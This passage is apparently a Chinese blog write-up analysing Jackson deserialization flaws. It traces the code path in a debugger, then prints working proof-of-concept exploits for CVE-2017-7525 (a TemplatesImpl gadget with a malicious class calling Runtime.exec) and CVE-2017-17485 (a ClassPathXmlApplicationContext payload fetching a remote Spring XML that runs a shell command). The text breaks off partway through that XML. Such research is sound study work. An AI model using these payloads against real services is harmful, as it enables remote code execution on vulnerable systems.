src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966150278-b2f3efdf-9604-4e03-937a-81a9d6f085bb.png" alt=""></p><p>在反序列化时会调用 构造函数和setter方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966188018-7f5b9978-0891-4e28-8514-b031ccd08196.png" alt=""></p><h3 id="JsonTypeInfo注解-2">@JsonTypeInfo注解</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966272892-a359060f-4fca-491d-89e6-39ae4e7acfbf.png" alt=""></p><p>输出看到，和使用DefaultTyping是一样的<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734966245091-0fa05779-a503-4827-9ab2-7c496f850d92.png" alt=""></p><h3 id="调试分析">调试分析</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969016816-3545a39b-daf7-4228-901d-36fd9662d435.png" alt=""></p><p>首先跟到_readMapAndClose方法中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969349829-2f2626f1-5b62-44a4-9df8-eaa239d81348.png" alt=""></p><p>这里会调用deserialize方法进行反序列化跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969398412-df9846dd-bce0-469e-b9b1-b639e0218f72.png" alt=""></p><p>这里又会调用vanillaDeserialize方法跟进去</p><p>�<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969460707-f79e94ae-5d1d-4264-92a4-468fba91e596.png" alt=""></p><p>首先会调用createUsingDefault方法创建对象实例可以跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969493721-e376201b-c750-4792-8815-42a7e5e8cd7e.png" alt=""></p><p>�<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969595789-33f63c64-f232-4529-adaf-55837d1a0c8d.png" alt=""></p><p>可以看到存着person对象跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969623411-af31bd03-f397-488d-a8c2-ea0f521d90b3.png" alt=""></p><p>进行实例化调用person的构造方法。在这之后会进入do - while循环</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734969763454-16620106-f349-4cf2-bf07-b3108ec2ff22.png" alt=""></p><p>循环里会调用deserializeAndSet()函数来解析并设置Bean的属性值跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735012872772-3bded198-77a6-4f1c-85c5-b1e6a85354f0.png" alt=""></p><p>这里有两个反序列化函数如果反序列化的字符串中带有class则会进入deserializeWithType方法否则会进入deserialize方法。这里由于第一个属性时age属性所以会直接进入deserialize方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013921590-2c52542a-37c9-4d5d-bd76-4de7bbe5963f.png" alt=""></p><p>这里会去获取age的属性值继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735014009481-3ee9f43a-e7fb-4851-900b-ac12f076057d.png" alt=""></p><p>然后会反射调用他的setter方法</p><p>下面我们在来看看进入deserializeWithType方法是啥样的我们已经获取到address属性所以会进入deserializeWithType方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013083610-aca256bf-d979-4361-9054-63ff5dcb575a.png" alt=""></p><p>这里在函数最后会调用deserializeTypedFromObject方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013259513-f8402e8c-49c7-400d-aa2d-fd9b7dc83a89.png" alt=""></p><p>�会走到_deserializeTypedUsingDefaultImpl方法里去跟进去</p><p>�<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013366577-12b29d51-b1df-4705-bc98-72349d3777a6.png" alt=""></p><p>接着会走到这个deserializeTypedFromAny方法中看看干了什么</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013427069-b0d36b1b-49fb-4a9e-b982-dce1266f9f28.png" alt=""></p><p>继续调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013446640-1f1f2030-893b-454d-bd5d-bab1e83d618a.png" alt=""></p><p>这里调了一个反序列化方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735013486083-061907e7-ea76-4682-8a08-f46774fffde7.png" alt=""></p><p>到这里就会发现和前面实例化对象就很像了就是前面的流程在走一遍。</p><h2 id="反序列化漏洞">反序列化漏洞</h2><p>通过上面的调试流程分析可以得出如果想要触发漏洞需要有几个前提条件</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h3 id="原理">原理</h3><p>当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。下面手动实验一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735015852993-7e282fff-e173-4737-8054-bb94fdad9a76.png" alt=""></p><p>可以看到是可以弹出计算器的，但是很少会有开发把危险方法写在setter方法或者构造函数里的。但是如果属性为object类型的话就可以给这个属性赋值任何类型那么就可以寻找存在构造函数或setter方法中存在漏洞的类进行利用了我们自己先写一个demo试试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735016417455-aab7d1de-065b-4998-a801-949dc463dddb.png" alt=""></p><p>先引入一个恶意类手动构造一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> objectMapper.readValue(<span class="string">&quot;&#123;\&quot;age\&quot;:0,\&quot;name\&quot;:null,\&quot;object\&quot;:&#123;\&quot;@class\&quot;:\&quot;com.ocean.zbz\&quot;,\&quot;cmd\&quot;:\&quot;open -a Calculator\&quot;&#125;,\&quot;address\&quot;:null,\&quot;zbz\&quot;:null&#125;&quot;</span>, Person.class);</span><br><span class="line">        System.out.println(person1);</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735016454962-832a1786-ae0e-405a-99aa-ccbd196ec660.png" alt=""></p><p>是可以成功弹出计算器的</p><h3 id="CVE-2017-7525（基于TemplatesImpl利用链）">CVE-2017-7525（基于TemplatesImpl利用链）</h3><h4 id="条件、版本">条件、版本</h4><p>Jackson 2.6系列 &lt; 2.6.7.1</p><p>Jackson 2.7系列 &lt; 2.7.9.1</p><p>Jackson 2.8系列 &lt; 2.8.8.1</p><p>JDK&lt;7u80</p><p>poc代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_vul</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/jackson_stu/src/main/java/Exp.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;hack&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Hack hack;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hack = mapper.readValue(jsonInput, Hack.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)),byteArrayOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">            br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                System.out.println(sb);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWritter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file.getName(),<span class="literal">true</span>);</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">bufferWritter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(fileWritter);</span><br><span class="line">            bufferWritter.write(sb.toString());</span><br><span class="line">            bufferWritter.close();</span><br><span class="line">            System.out.println(sb);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hack</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调试分析-2">调试分析</h4><p>其实这里我们会有一个疑问就是jackson在反序列化的时候是调用setter方法并没有执行getter方法而templates链的漏洞触发点是在getter方法里的所以我们下断点跟进去看看到底是怎么触发的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735027327122-8aaf9855-d504-4458-82fa-32e05b25eb7f.png" alt=""></p><p>直接断到关键点这里，这里最关键的其实就是prop这个对象调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法：<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735027394290-20b624d3-a3c1-4eda-a62d-7744f803f7b4.png" alt=""></p><p>然后跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735027411092-cec4af20-f818-47a1-be21-6bbdf842b8ce.png" alt=""></p><p>这里会调用getter方法。后续的执行流程就不在分析了</p><p>至于为什么不能在高版本的利用看的其他师傅的博客因为我本地环境有点问题</p><p>:::tips<br>需要设置一个<code>_factory</code>属性，但是我们如果在payload中添加该属性，程序会报错：com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field “_factory” (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: “uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”])</p><p>说明Jackson不支持我们添加<code>_tfactory</code>属性。</p><p>:::</p><h3 id="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）">CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h3><h4 id="条件、版本-2">条件、版本</h4><p>Jackson 2.7系列 &lt; 2.7.9.2</p><p>Jackson 2.8系列 &lt; 2.8.11</p><p>Jackson 2.9系列 &lt; 2.9.4</p><p>jdk不受限制可以在1.8的版本上跑</p><h4 id="依赖">依赖</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-codec/commons-codec --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-io/commons-io --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-core --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-context --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework/spring-expression --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">5.0</span><span class="number">.2</span>.RELEASE&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_vul_classpath</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1/spel.xml\&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/zsh<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        